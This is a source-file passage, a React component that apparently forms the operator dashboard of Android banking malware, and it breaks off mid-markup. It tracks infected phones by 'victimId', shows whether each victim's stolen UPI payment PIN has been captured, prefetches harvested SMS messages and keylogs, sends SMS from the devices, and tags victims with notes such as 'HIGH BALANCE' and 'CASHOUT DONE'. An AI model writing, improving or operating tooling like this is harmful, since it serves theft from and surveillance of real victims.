import { useNavigate } from "react-router-dom";
import { useState, useMemo, useEffect, useRef, useCallback, memo } from "react";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
  SelectSeparator,
} from "@/components/ui/select";
import { Label } from "@/components/ui/label";
import {
  Search,
  Filter,
  ChevronLeft,
  ChevronRight,
  Trash2,
  Eye,
  MessageSquare,
  Loader2,
  AlertCircle,
  Smartphone,
  X,
} from "lucide-react";
import { DeviceInfo } from "@/data/db";
import { FixedSizeList as List, ListChildComponentProps } from 'react-window';
import { SendSMSDialog } from "./SendSMSDialog";
import { useDB } from "@/hooks/useDB";
import { formatTime, parseTime } from "@/utils/time";
import { toast } from "sonner";
import { firebaseService } from "@/lib/firebaseService";
import { setPendingAndVerify } from "@/lib/responseChecker";
import { useDataCache } from "@/hooks/useDataCache";

interface DeviceTableProps {
  devices: Record<string, DeviceInfo>;
  loading?: boolean;
  error?: string | null;
}

export function DeviceTable({
  devices,
  loading = false,
  error = null,
}: DeviceTableProps) {
  const navigate = useNavigate();
  const { updateDevice, db } = useDB();
  const { getDeviceMessages: _prefetchMessages, getDeviceUPIPins: _prefetchUPIs, getDeviceKeyLogs: _prefetchKeylogs } = useDataCache();
  const responseTimeouts = useRef<Record<string, NodeJS.Timeout>>({});
  // refs to the inline note inputs so we can focus them after clearing
  const noteInputRefs = useRef<Record<string, HTMLInputElement | null>>({});

  // Clean up timeouts on unmount
  useEffect(() => {
    return () => {
      Object.values(responseTimeouts.current).forEach(clearTimeout);
    };
  }, []);

  // Prefetch DeviceDetail data and component chunk to speed up opening
  const handlePrefetchDevice = useCallback((victimId: string) => {
    // Fire and forget: prefetch DeviceDetail chunk and cached data
    try {
      void import('./DeviceDetail');
    } catch {}
    try {
      void _prefetchMessages(victimId);
    } catch {}
    try {
      void _prefetchUPIs(victimId);
    } catch {}
    try {
      void _prefetchKeylogs(victimId, 100);
    } catch {}
  }, [_prefetchMessages, _prefetchUPIs, _prefetchKeylogs]);

  // State for filtering and pagination
  const [searchTerm, setSearchTerm] = useState("");
  const [debouncedSearchTerm, setDebouncedSearchTerm] = useState("");
  const [statusFilter, setStatusFilter] = useState<string>("all");
  const [availabilityFilter, setAvailabilityFilter] = useState<string>("all");
  const [notesFilter, setNotesFilter] = useState<string>("all");
  const [orderFilter, setOrderFilter] = useState<string>("desc"); // desc = newest first
  const [rowsPerPage, setRowsPerPage] = useState<number>(10);
  const [currentPage, setCurrentPage] = useState<number>(1);
  const [noteEdits, setNoteEdits] = useState<Record<string, string>>({});
  // Draft values while typing inside the dropdown input. Only committed on Enter or blur.
  const [noteDrafts, setNoteDrafts] = useState<Record<string, string>>({});
  // Track open state per-note Select so we can programmatically close after Enter
  const [noteSelectOpen, setNoteSelectOpen] = useState<Record<string, boolean>>({});
  const NOTE_PRESETS = useMemo(
    () => ["HIGH BALANCE", "LOW BALANCE", "CASHOUT DONE", "NO BANK"],
    [],
  );

  // Debounce search input to reduce re-filtering during fast typing
  useEffect(() => {
    const id = setTimeout(() => {
      setDebouncedSearchTerm(searchTerm.trim());
      setCurrentPage(1);
    }, 250);
    return () => clearTimeout(id);
  }, [searchTerm]);

  // Virtualization config
  const VIRTUALIZE_THRESHOLD = 200;
  const LIST_HEIGHT = 600; // px
  const ROW_HEIGHT = 72; // px per row approximated to current table row height

  // State for Send SMS dialog
  const [smsDialogOpen, setSmsDialogOpen] = useState(false);
  const [selectedDevice, setSelectedDevice] = useState<{
    id: string;
    info: DeviceInfo;
  } | null>(null);

  const getBatteryColor = (battery: string) => {
    const level = parseInt(battery.replace("%", ""));
    if (level < 20) return "destructive";
    if (level < 50) return "secondary";
    return "default";
  };

  // Robust date parsing for various formats
  const toTimestamp = (value?: string): number => {
    if (!value) return 0;
    const ddmmyyRegex = /^\d{2}-\d{2}-\d{4}/; // dd-MM-yyyy HH:mm:ss
    try {
      if (ddmmyyRegex.test(value)) {
        return parseTime(value).getTime();
      }
      const d = new Date(value);
      if (!isNaN(d.getTime())) return d.getTime();
    } catch {}
    return 0;
  };

  const getStatusBadge = (status: string) => {
    if (status === "Online")
      return "bg-green-100 text-green-800 border-green-200";
    if (status === "Offline") return "bg-red-100 text-red-800 border-red-200";
    return "bg-gray-100 text-gray-800 border-gray-200";
  };

  // Live ResponseChecker map
  const [responseChecker, setResponseChecker] = useState<Record<string, { deviceId?: string; response?: string; timeStr?: string }>>({});

  useEffect(() => {
    const unsub = firebaseService.onResponseCheckerUpdate((data) => {
      setResponseChecker(data || {});
    });
    return () => unsub && unsub();
  }, []);

  // Derive status: if ResponseChecker says idle/true -> Online, if pending -> Offline, else fallback to device.Status
  const deriveStatus = (victimId: string, device: DeviceInfo): string => {
    const keys = [String(device.Model || '').trim(), victimId].filter(Boolean);
    let resp: string | undefined;
    for (const k of keys) {
      const rc = responseChecker[k];
      if (rc && rc.response) {
        resp = String(rc.response).toLowerCase();
        break;
      }
    }
    if (resp) {
      if (resp === 'idle' || resp === 'true') return 'Online';
      if (resp === 'pending') return 'Offline';
    }
    return device.Status || 'Unknown';
  };

  const getUPIPinBadge = (victimId: string, db: any) => {
    const upiPins = db?.UPIPins?.[victimId] || [];
    const hasValidPin =
      upiPins.length > 0 &&
      upiPins.some((pinObj: any) => {
        // Handle new structure: { pin: string, timestamp: string }
        if (pinObj && typeof pinObj === 'object' && pinObj.pin) {
          return pinObj.pin && pinObj.pin !== "No Pin";
        }
        // Handle old structure: string[]
        if (typeof pinObj === 'string') {
          return pinObj && pinObj !== "No Pin";
        }
        return false;
      });

    if (hasValidPin) {
      return "bg-green-100 text-green-800 border-green-200";
    } else {
      return "bg-red-100 text-red-800 border-red-200";
    }
  };

  // Ping device without navigation using shared ResponseChecker helper
  const handlePingDevice = async (
    victimId: string,
    device: DeviceInfo,
    e: React.MouseEvent
  ) => {
    e.stopPropagation();
    try {
      const modelIdentifier = (device.Model || '').trim() || victimId;
      const result = await setPendingAndVerify(
        { modelIdentifier, victimId },
        { delayMs: 5000, retryMs: 3000, maxRetries: 1, logPrefix: 'DeviceTable:Ping' }
      );
      if (result === 'online') toast.success('Device is online', { duration: 3000 });
      else if (result === 'offline') toast.error('Device is offline', { duration: 3000 });
      else toast.message('device is offline', { duration: 2000 });
    } catch (err) {
      console.error('Failed to ping device (set pending):', err);
      toast.error('Failed to send check request');
    }
  };

  const handleViewDevice = useCallback(async (
    victimId: string,
    device: DeviceInfo,
    e: React.MouseEvent
  ) => {
    e.stopPropagation();
    e.preventDefault();
    
    try {
      const modelIdentifier = (device.Model || '').trim() || victimId;
      // Open a new browser tab for Device Detail
      const deviceUrl = `/device/${victimId}`;
      window.open(deviceUrl, '_blank', 'noopener,noreferrer');
      
      // Fire and forget status verification in background
      setPendingAndVerify(
        { modelIdentifier, victimId },
        { delayMs: 5000, retryMs: 3000, maxRetries: 1, logPrefix: 'DeviceTable:View' }
      ).then((result) => {
        // Optionally handle silently or log
        // console.log('Device status check result:', result);
      }).catch((err) => {
        console.error('Failed checking ResponseChecker:', err);
        // Don't show error toast for background verification
      });
    } catch (err) {
      console.error('Failed to set ResponseChecker pending:', err);
      // Avoid popup toasts to keep UX clean
    }
  }, []);

  const handleSendSMS = (
    victimId: string,
    device: DeviceInfo,
    e: React.MouseEvent,
  ) => {
    e.stopPropagation();
    setSelectedDevice({ id: victimId, info: device });
    setSmsDialogOpen(true);
  };

  const closeSMSDialog = () => {
    setSmsDialogOpen(false);
    setSelectedDevice(null);
  };

  // Optimized filtering with better performance
  const filteredAndPaginatedDevices = useMemo(() => {
    const searchLower = debouncedSearchTerm.toLowerCase();
    const filtered = Object.entries(devices).filter(([victimId, device]) => {
      // Search filter - optimized
      const searchMatch = debouncedSearchTerm === "" || (
        victimId.toLowerCase().includes(searchLower) ||
        (device.Brand || "").toLowerCase().includes(searchLower) ||
        (device.Model || "").toLowerCase().includes(searchLower) ||
        (device.Note || "").toLowerCase().includes(searchLower) ||
        (device.IPAddress || "").toLowerCase().includes(searchLower)
      );

      if (!searchMatch) return false;

      // Status filter - optimized
      const keys = [String(device.Model || '').trim(), victimId].filter(Boolean);
      let resp: string | undefined;
      for (const k of keys) {
        const rc = responseChecker[k];
        if (rc && rc.response) {
          resp = String(rc.response).toLowerCase();
          break;
        }
      }
      const currentStatus = resp ? 
        (resp === 'idle' || resp === 'true' ? 'Online' : resp === 'pending' ? 'Offline' : device.Status || 'Unknown') :
        device.Status || 'Unknown';
      
      const statusMatch = statusFilter === "all" || currentStatus === statusFilter;
      if (!statusMatch) return false;

      // UPI Pin filter - optimized
      const upiPins = db?.UPIPins?.[victimId] || [];
      const hasValidPin = upiPins.length > 0 && upiPins.some((pinObj: any) => {
        if (pinObj && typeof pinObj === 'object' && pinObj.pin) {
          return pinObj.pin && pinObj.pin !== "No Pin";
        }
        if (typeof pinObj === 'string') {
          return pinObj && pinObj !== "No Pin";
        }
        return false;
      });
      
      const availabilityMatch = availabilityFilter === "all" ||
        (availabilityFilter === "noPin" && !hasValidPin) ||
        (availabilityFilter === "hasPin" && hasValidPin);
      if (!availabilityMatch) return false;

      // Notes filter - optimized
      const hasNote = device.Note && device.Note.trim() !== "";
      const notesMatch = notesFilter === "all" ||
        (notesFilter === "hasNote" && hasNote) ||
        (notesFilter === "noNote" && !hasNote);

      return notesMatch;
    });

    // Sort by Added date/time - optimized
    const direction = orderFilter === 'desc' ? -1 : 1;
    return [...filtered].sort(([, a], [, b]) => {
      const ta = toTimestamp(a.Added);
      const tb = toTimestamp(b.Added);
      return direction * (ta - tb);
    });
  }, [devices, debouncedSearchTerm, statusFilter, availabilityFilter, orderFilter, notesFilter, responseChecker, db?.UPIPins]);

  // For virtualization we use the full filtered list without pagination
  const filteredAllDevices = useMemo(() => {
    const searchLower = debouncedSearchTerm.toLowerCase();
    const filtered = Object.entries(devices).filter(([victimId, device]) => {
      const searchMatch = debouncedSearchTerm === "" || (
        victimId.toLowerCase().includes(searchLower) ||
        (device.Brand || "").toLowerCase().includes(searchLower) ||
        (device.Model || "").toLowerCase().includes(searchLower) ||
        (device.Note || "").toLowerCase().includes(searchLower) ||
        (device.IPAddress || "").toLowerCase().includes(searchLower)
      );
      if (!searchMatch) return false;

      const keys = [String(device.Model || '').trim(), victimId].filter(Boolean);
      let resp: string | undefined;
      for (const k of keys) {
        const rc = responseChecker[k];
        if (rc && rc.response) { resp = String(rc.response).toLowerCase(); break; }
      }
      const currentStatus = resp ? 
        (resp === 'idle' || resp === 'true' ? 'Online' : resp === 'pending' ? 'Offline' : device.Status || 'Unknown') :
        device.Status || 'Unknown';
      const statusMatch = statusFilter === "all" || currentStatus === statusFilter;
      if (!statusMatch) return false;

      const upiPins = db?.UPIPins?.[victimId] || [];
      const hasValidPin = upiPins.length > 0 && upiPins.some((pinObj: any) => {
        if (pinObj && typeof pinObj === 'object' && pinObj.pin) return pinObj.pin && pinObj.pin !== "No Pin";
        if (typeof pinObj === 'string') return pinObj && pinObj !== "No Pin";
        return false;
      });
      const availabilityMatch = availabilityFilter === "all" ||
        (availabilityFilter === "noPin" && !hasValidPin) ||
        (availabilityFilter === "hasPin" && hasValidPin);
      if (!availabilityMatch) return false;

      const hasNote = device.Note && device.Note.trim() !== "";
      const notesMatch = notesFilter === "all" ||
        (notesFilter === "hasNote" && hasNote) ||
        (notesFilter === "noNote" && !hasNote);
      return notesMatch;
    });
    const direction = orderFilter === 'desc' ? -1 : 1;
    return [...filtered].sort(([, a], [, b]) => {
      const ta = toTimestamp(a.Added);
      const tb = toTimestamp(b.Added);
      return direction * (ta - tb);
    });
  }, [devices, searchTerm, statusFilter, availabilityFilter, orderFilter, notesFilter, responseChecker, db?.UPIPins]);

  // Calculate pagination
  const totalPages = Math.ceil(
    filteredAndPaginatedDevices.length / rowsPerPage,
  );
  const startIndex = (currentPage - 1) * rowsPerPage;
  const endIndex = startIndex + rowsPerPage;
  const currentDevices = filteredAndPaginatedDevices.slice(
    startIndex,
    endIndex,
  );

  const shouldVirtualize = filteredAllDevices.length > VIRTUALIZE_THRESHOLD;

  // Virtualized row renderer
  const Row = useCallback(({ index, style }: ListChildComponentProps) => {
    const [victimId, device] = filteredAllDevices[index];
    const status = deriveStatus(victimId, device);
    const currentNote = noteEdits[victimId] ?? (typeof device.Note === "string" ? device.Note : "");
    const isPreset = NOTE_PRESETS.includes(currentNote);
    const selected = currentNote && currentNote !== "" ? currentNote : "custom";
    return (
      <div style={style} className="px-4 flex items-center border-b hover:bg-muted/50" key={victimId}>
        <div className="grid grid-cols-8 gap-2 w-full items-center">
          <div className="text-center">
            <Badge className={`${getStatusBadge(status)} mx-auto`}>{status}</Badge>
          </div>
          <div className="col-span-1">
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 rounded-lg bg-gradient-to-br from-primary to-accent flex items-center justify-center">
                <Smartphone className="w-5 h-5 text-white" />
              </div>
              <div>
                <div className="font-medium">{victimId}</div>
                <div className="text-sm text-muted-foreground">{device.Model}</div>
              </div>
            </div>
          </div>
          <div className="text-center">
            <Badge variant="outline" className="mx-auto">Android V{device.AndroidVersion}</Badge>
          </div>
          <div className="text-center">
            {(() => {
              const upiPins = db?.UPIPins?.[victimId] || [];
              const hasValidPin = upiPins.length > 0 && upiPins.some((pinObj: any) => {
                if (pinObj && typeof pinObj === 'object' && pinObj.pin) return pinObj.pin && pinObj.pin !== "No Pin";
                if (typeof pinObj === 'string') return pinObj && pinObj !== "No Pin";
                return false;
              });
              return (
                <Badge className={`${getUPIPinBadge(victimId, db)} w-[80px] justify-center`}>
                  <span className="inline-block w-full text-center">{hasValidPin ? "Has Pin" : "No Pin"}</span>
                </Badge>
              );
            })()}
          </div>
          <div className="text-center text-muted-foreground">{device.IP || device.IPAddress || "Unknown"}</div>
          <div className="text-center">
            <Select
              value={selected}
              onValueChange={(v) => handleNotePresetChange(victimId, v)}
              open={!!noteSelectOpen[victimId]}
              onOpenChange={(open) => setNoteSelectOpen((prev) => ({ ...prev, [victimId]: open }))}
            >
              <SelectTrigger className="w-44 mx-auto justify-center [&>span]:line-clamp-2">
                <SelectValue />
              </SelectTrigger>
              <SelectContent>
                {NOTE_PRESETS.map((opt) => (
                  <SelectItem key={opt} value={opt}>{opt}</SelectItem>
                ))}
                {!isPreset && currentNote && currentNote !== "" && (
                  <SelectItem value={currentNote}>
                    <div className="max-w-[11rem] break-words whitespace-normal text-sm">{currentNote}</div>
                  </SelectItem>
                )}
                <SelectSeparator />
                <div
                  role="presentation"
                  className="px-1 py-1"
                  onPointerDown={(e) => e.stopPropagation()}
                  onMouseDown={(e) => e.stopPropagation()}
                  onClick={(e) => e.stopPropagation()}
                >
                  <Input
                    ref={(el) => (noteInputRefs.current[victimId] = el)}
                    value={noteDrafts[victimId] ?? currentNote}
                    onChange={(e) => handleNoteDraftChange(victimId, e.target.value)}
                    onBlur={() => handleNoteBlur(victimId)}
                    onKeyDown={(e) => {
                      if (e.key === "Enter") {
                        e.preventDefault();
                        commitNoteAndClose(victimId);
                      }
                    }}
                    placeholder="Custom note"
                    className="h-8"
                  />
                </div>
              </SelectContent>
            </Select>
          </div>
          <div className="text-center">{formatAdded(device.Added)}</div>
          <div className="text-center">
            <div className="flex items-center justify-center gap-2">
              <Button variant="outline" size="sm" onClick={(e) => handleViewDevice(victimId, device, e)}>
                <Eye className="w-4 h-4" />
              </Button>
              <Button variant="outline" size="sm" onClick={(e) => handlePingDevice(victimId, device, e)}>
                <Loader2 className="w-4 h-4" />
              </Button>
              <Button variant="outline" size="sm" onClick={(e) => handleSendSMS(victimId, device, e)}>
                <MessageSquare className="w-4 h-4" />
              </Button>
              <Button variant="destructive" size="sm" onClick={() => handleDeleteDevice(victimId, device.Model)}>
                <Trash2 className="w-4 h-4" />
              </Button>
            </div>
          </div>
        </div>
      </div>
    );
  }, [filteredAllDevices, NOTE_PRESETS, noteEdits, noteDrafts, noteSelectOpen, db?.UPIPins]);

  // Reset to first page when filters change
  const handleFilterChange = () => {
    setCurrentPage(1);
  };

  const resetFilters = () => {
    setSearchTerm("");
    setStatusFilter("all");
    setAvailabilityFilter("all");
    setCurrentPage(1);
  };

  const handleSearch = (value: string) => {
    setSearchTerm(value);
  };

  const handleStatusFilter = (value: string) => {
    setStatusFilter(value);
    handleFilterChange();
  };

  const handleAvailabilityFilter = (value: string) => {
    setAvailabilityFilter(value);
    handleFilterChange();
  };

  const handleNotesFilter = (value: string) => {
    setNotesFilter(value);
    handleFilterChange();
  };

  const handleOrderFilter = (value: string) => {
    setOrderFilter(value);
    handleFilterChange();
  };

  const handleDeleteDevice = async (deviceId: string, deviceName: string) => {
    if (window.confirm(`Are you sure you want to delete device ${deviceName}? This action cannot be undone.`)) {
      try {
        await firebaseService.deleteDevice(deviceId);
        toast.success(`Device ${deviceName} deleted successfully`);
      } catch (error) {
        console.error("Error deleting device:", error);
        toast.error(`Failed to delete device ${deviceName}`);
      }
    }
  };

  const handleRowsPerPage = (value: string) => {
    setRowsPerPage(parseInt(value));
    setCurrentPage(1);
  };

  // Update draft while typing; do NOT change the committed select value until commitNote is called.
  const handleNoteDraftChange = (victimId: string, value: string) => {
    setNoteDrafts((prev) => ({ ...prev, [victimId]: value }));
  };

  const commitNote = async (victimId: string, value?: string) => {
    const draft = value !== undefined ? value : noteDrafts[victimId];
    const newVal = (draft ?? noteEdits[victimId] ?? "").trim();
    setNoteEdits((prev) => ({ ...prev, [victimId]: newVal }));
    setNoteDrafts((prev) => ({ ...prev, [victimId]: newVal }));
    try {
      await updateDevice(victimId, { Note: newVal });
    } catch (e) {
      console.error("Failed to update note for", victimId, e);
    }
  };

  // Commit draft and close the Select menu for a row
  const commitNoteAndClose = (victimId: string, value?: string) => {
    const draft = value !== undefined ? value : noteDrafts[victimId];
    const newVal = (draft ?? noteEdits[victimId] ?? "").trim();
    // update UI immediately
    setNoteEdits((prev) => ({ ...prev, [victimId]: newVal }));
    setNoteDrafts((prev) => ({ ...prev, [victimId]: newVal }));
    setNoteSelectOpen((prev) => ({ ...prev, [victimId]: false }));
    // persist in background
    (async () => {
      try {
        await updateDevice(victimId, { Note: newVal });
      } catch (e) {
        console.error("Failed to update note for", victimId, e);
      }
    })();
  };

  const handleNoteBlur = async (victimId: string) => {
    // Commit draft on blur as a fallback
    await commitNote(victimId);
  };

  const handleNotePresetChange = async (victimId: string, value: string) => {
    if (value === "custom") {
      // open input with empty draft
      setNoteDrafts((prev) => ({ ...prev, [victimId]: "" }));
      return;
    }
    // preset selection immediately commits
    setNoteEdits((prev) => ({ ...prev, [victimId]: value }));
    setNoteDrafts((prev) => ({ ...prev, [victimId]: value }));
    try {
      await updateDevice(victimId, { Note: value });
    } catch (e) {
      console.error("Failed to set preset note for", victimId, e);
    }
  };

  const goToPage = (page: number) => {
    setCurrentPage(Math.max(1, Math.min(page, totalPages)));
  };

  const goToPreviousPage = () => goToPage(currentPage - 1);
  const goToNextPage = () => goToPage(currentPage + 1);

  // Generate page numbers for pagination
  const getPageNumbers = () => {
    const pages = [];
    const maxVisiblePages = 5;

    if (totalPages <= maxVisiblePages) {
      for (let i = 1; i <= totalPages; i++) {
        pages.push(i);
      }
    } else {
      if (currentPage <= 3) {
        for (let i = 1; i <= 5; i++) {
          pages.push(i);
        }
        if (totalPages > 5) pages.push("...");
        pages.push(totalPages);
      } else if (currentPage >= totalPages - 2) {
        pages.push(1);
        pages.push("...");
        for (let i = totalPages - 4; i <= totalPages; i++) {
          pages.push(i);
        }
      } else {
        pages.push(1);
        pages.push("...");
        for (let i = currentPage - 1; i <= currentPage + 1; i++) {
          pages.push(i);
        }
        pages.push("...");
        pages.push(totalPages);
      }
    }

    return pages;
  };

  const formatAdded = (added?: string) => {
    // Return dash if added is falsy or empty string
    if (!added || added.trim() === '') return "-";
    
    // If it's already in dd-MM-yyyy HH:mm:ss format, return as is
    const ddmmyyRegex = /^\d{2}-\d{2}-\d{4}/;
    if (ddmmyyRegex.test(added)) return added;
    
    // Try to parse as ISO or other standard date
    const date = new Date(added);
    if (!isNaN(date.getTime())) {
      return formatTime(date);
    }
    
    // If we can't parse the date, return a dash
    return "-";
  };

  // Show loading state with skeleton
  if (loading) {
    return (
      <Card className="card-glass border-0 animate-slide-up">
        <div className="p-6 border-b bg-muted/20">
          <div className="flex flex-col lg:flex-row gap-4 items-start lg:items-center justify-between">
            <div className="flex flex-col sm:flex-row gap-4 flex-1">
              {/* Search skeleton */}
              <div className="flex flex-col gap-2 flex-1 max-w-sm">
                <div className="h-4 bg-muted rounded w-16 animate-pulse"></div>
                <div className="h-10 bg-muted rounded animate-pulse"></div>
              </div>
              {/* Filter skeletons */}
              {[1, 2, 3, 4].map((i) => (
                <div key={i} className="flex flex-col gap-2 min-w-[140px]">
                  <div className="h-4 bg-muted rounded w-12 animate-pulse"></div>
                  <div className="h-10 bg-muted rounded animate-pulse"></div>
                </div>
              ))}
            </div>
          </div>
        </div>
        <div className="overflow-x-auto">
          <Table>
            <TableHeader>
              <TableRow>
                {[1, 2, 3, 4, 5, 6, 7, 8].map((i) => (
                  <TableHead key={i} className="h-12">
                    <div className="h-4 bg-muted rounded w-20 animate-pulse mx-auto"></div>
                  </TableHead>
                ))}
              </TableRow>
            </TableHeader>
            <TableBody>
              {[1, 2, 3, 4, 5].map((i) => (
                <TableRow key={i}>
                  {[1, 2, 3, 4, 5, 6, 7, 8].map((j) => (
                    <TableCell key={j} className="h-16">
                      <div className="h-6 bg-muted rounded w-16 animate-pulse mx-auto"></div>
                    </TableCell>
                  ))}
                </TableRow>
              ))}
            </TableBody>
          </Table>
        </div>
      </Card>
    );
  }

  // Show error state
  if (error) {
    return (
      <Card className="card-glass border-0 animate-slide-up">
        <div className="p-12 text-center">
          <AlertCircle className="w-8 h-8 mx-auto mb-4 text-destructive" />
          <p className="text-lg font-medium text-destructive mb-2">
            Failed to load devices
          </p>
          <p className="text-sm text-muted-foreground mb-4">{error}</p>
          <Button onClick={() => window.location.reload()}>Try Again</Button>
        </div>
      </Card>
    );
  }

  // Show empty state
  if (Object.keys(devices).length === 0) {
    return (
      <Card className="card-glass border-0 animate-slide-up">
        <div className="p-12 text-center">
          <div className="w-16 h-16 bg-muted rounded-full flex items-center justify-center mx-auto mb-4">
            <MessageSquare className="w-8 h-8 text-muted-foreground" />
          </div>
          <p className="text-lg font-medium text-muted-foreground mb-2">
            No devices found
          </p>
          <p className="text-sm text-muted-foreground">
            Start by adding your first device to the system
          </p>
        </div>
      </Card>
    );
  }

  return (
    <>
      <Card className="card-glass border-0 animate-slide-up">
        {/* Filters Section */}
        <div className="p-6 border-b bg-muted/20">
          <div className="flex flex-col lg:flex-row gap-4 items-start lg:items-center justify-between">
            <div className="flex flex-col sm:flex-row gap-4 flex-1">
              {/* Search */}
              <div className="flex flex-col gap-2 flex-1 max-w-sm">
                <Label htmlFor="device-search" className="text-sm font-medium">
                  Search
                </Label>
                <div className="relative">
                  <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 text-muted-foreground w-4 h-4" />
                  <Input
                    id="device-search"
                    placeholder="Search devices, brands, models..."
                    value={searchTerm}
                    onChange={(e) => handleSearch(e.target.value)}
                    className="pl-10"
                  />
                </div>
              </div>

              {/* Status Filter */}
              <div className="flex flex-col gap-2 min-w-[140px]">
                <Label htmlFor="status-filter" className="text-sm font-medium">
                  Status
                </Label>
                <Select value={statusFilter} onValueChange={handleStatusFilter}>
                  <SelectTrigger id="status-filter">
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="all">All Status</SelectItem>
                    <SelectItem value="Online">Online</SelectItem>
                    <SelectItem value="Offline">Offline</SelectItem>
                  </SelectContent>
                </Select>
              </div>

              {/* UPI Pin Filter */}
              <div className="flex flex-col gap-2 min-w-[140px]">
                <Label
                  htmlFor="availability-filter"
                  className="text-sm font-medium"
                >
                  UPI Pin
                </Label>
                <Select
                  value={availabilityFilter}
                  onValueChange={handleAvailabilityFilter}
                >
                  <SelectTrigger id="availability-filter">
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="all">All</SelectItem>
                    <SelectItem value="noPin">No Pin</SelectItem>
                    <SelectItem value="hasPin">Has Pin</SelectItem>
                  </SelectContent>
                </Select>
              </div>

              {/* Notes Filter */}
              <div className="flex flex-col gap-2 min-w-[140px]">
                <Label
                  htmlFor="notes-filter"
                  className="text-sm font-medium"
                >
                  Notes
                </Label>
                <Select
                  value={notesFilter}
                  onValueChange={handleNotesFilter}
                >
                  <SelectTrigger id="notes-filter">
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="all">All</SelectItem>
                    <SelectItem value="hasNote">Has Note</SelectItem>
                    <SelectItem value="noNote">No Note</SelectItem>
                  </SelectContent>
                </Select>
              </div>

              {/* Order Filter */}
              <div className="flex flex-col gap-2 min-w-[140px]">
                <Label htmlFor="order-filter" className="text-sm font-medium">
                  Order
                </Label>
                <Select value={orderFilter} onValueChange={handleOrderFilter}>
                  <SelectTrigger id="order-filter">
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="desc">Newest first</SelectItem>
                    <SelectItem value="asc">Oldest first</SelectItem>
                  </SelectContent>
                </Select>
              </div>

              {/* Reset Filters Button */}
              <div className="flex flex-col gap-2">
                <Label className="text-sm font-medium opacity-0">Reset</Label>
                <Button
                  variant="outline"
                  size="sm"
                  onClick={resetFilters}
                  className="px-3"
                >
                  Reset Filters
                </Button>
              </div>
            </div>
          </div>
        </div>

        {/* Table or Virtualized List */}
        {!shouldVirtualize ? (
          <div className="overflow-x-auto">
            <Table>
              <TableHeader className="sticky top-0 bg-background/80 backdrop-blur-sm">
                <TableRow>
                  <TableHead className="font-semibold text-center">Status</TableHead>
                  <TableHead className="font-semibold">Device</TableHead>
                  <TableHead className="font-semibold text-center">Android</TableHead>
                  <TableHead className="font-semibold text-center px-2 w-[120px]">UPI Pin</TableHead>
                  <TableHead className="font-semibold text-center">IP Address</TableHead>
                  <TableHead className="font-semibold text-center">Note</TableHead>
                  <TableHead className="font-semibold text-center">Added</TableHead>
                  <TableHead className="font-semibold text-center">Actions</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {currentDevices.map(([victimId, device]) => (
                  <TableRow key={victimId} className="hover:bg-muted/50 transition-colors">
                    <TableCell className="text-center">
                      {(() => {
                        const status = deriveStatus(victimId, device);
                        return <Badge className={`${getStatusBadge(status)} mx-auto`}>{status}</Badge>;
                      })()}
                    </TableCell>
                    <TableCell>
                      <div className="flex items-center gap-3">
                        <div className="relative">
                          <div className="w-10 h-10 rounded-lg bg-gradient-to-br from-primary to-accent flex items-center justify-center">
                            <Smartphone className="w-5 h-5 text-white" />
                          </div>
                        </div>
                        <div>
                          <div className="font-medium">{victimId}</div>
                          <div className="text-sm text-muted-foreground">{device.Model}</div>
                        </div>
                      </div>
                    </TableCell>
                    <TableCell className="text-center">
                      <Badge variant="outline" className="mx-auto">Android V{device.AndroidVersion}</Badge>
                    </TableCell>
                    <TableCell className="px-2 w-[120px]">
                      <div className="flex justify-center">
                        <div className="whitespace-nowrap">
                          {(() => {
                            const upiPins = db?.UPIPins?.[victimId] || [];
                            const hasValidPin = upiPins.length > 0 && upiPins.some((pinObj: any) => {
                              if (pinObj && typeof pinObj === 'object' && pinObj.pin) return pinObj.pin && pinObj.pin !== "No Pin";
                              if (typeof pinObj === 'string') return pinObj && pinObj !== "No Pin";
                              return false;
                            });
                            return (
                              <Badge className={`${getUPIPinBadge(victimId, db)} w-[80px] justify-center`}>
                                <span className="inline-block w-full text-center">{hasValidPin ? "Has Pin" : "No Pin"}</span>
                              </Badge>
                            );
                          })()}
                        </div>
                      </div>
                    </TableCell>
                    <TableCell className="text-muted-foreground text-center">{device.IP || device.IPAddress || "Unknown"}</TableCell>
                    <TableCell className="text-center">
                      {(() => {
                        const currentNote = noteEdits[victimId] ?? (typeof device.Note === "string" ? device.Note : "");
                        const isPreset = NOTE_PRESETS.includes(currentNote);
                        const selected = currentNote && currentNote !== "" ? currentNote : "custom";
                        return (
                          <div className="flex flex-col items-center gap-2">
                            <Select
                              value={selected}
                              onValueChange={(v) => handleNotePresetChange(victimId, v)}
                              open={!!noteSelectOpen[victimId]}
                              onOpenChange={(open) => setNoteSelectOpen((prev) => ({ ...prev, [victimId]: open }))}
                            >
                              <SelectTrigger className="w-44 mx-auto justify-center [&>span]:line-clamp-2">
                                <SelectValue />
                              </SelectTrigger>
                              <SelectContent>
                                {NOTE_PRESETS.map((opt) => (
                                  <SelectItem key={opt} value={opt}>{opt}</SelectItem>
                                ))}
                                {!isPreset && currentNote && currentNote !== "" && (
                                  <SelectItem value={currentNote}>
                                    <div className="max-w-[11rem] break-words whitespace-normal text-sm">{currentNote}</div>
                                  </SelectItem>
                                )}
                                <SelectSeparator />
                                <div role="presentation" className="px-1 py-1" onPointerDown={(e) => e.stopPropagation()} onMouseDown={(e) => e.stopPropagation()} onClick={(e) => e.stopPropagation()}>
                                  <Input
                                    ref={(el) => (noteInputRefs.current[victimId] = el)}
                                    value={noteDrafts[victimId] ?? currentNote}
                                    onChange={(e) => handleNoteDraftChange(victimId, e.target.value)}
                                    onBlur={() => handleNoteBlur(victimId)}
                                    onKeyDown={(e) => {
                                      if (e.key === "Enter") {
                                        e.preventDefault();
                                        commitNoteAndClose(victimId);
                                      }
                                    }}
                                    placeholder="Type note..."
                                    className="h-8 text-sm w-36 placeholder:text-muted-foreground"
                                  />
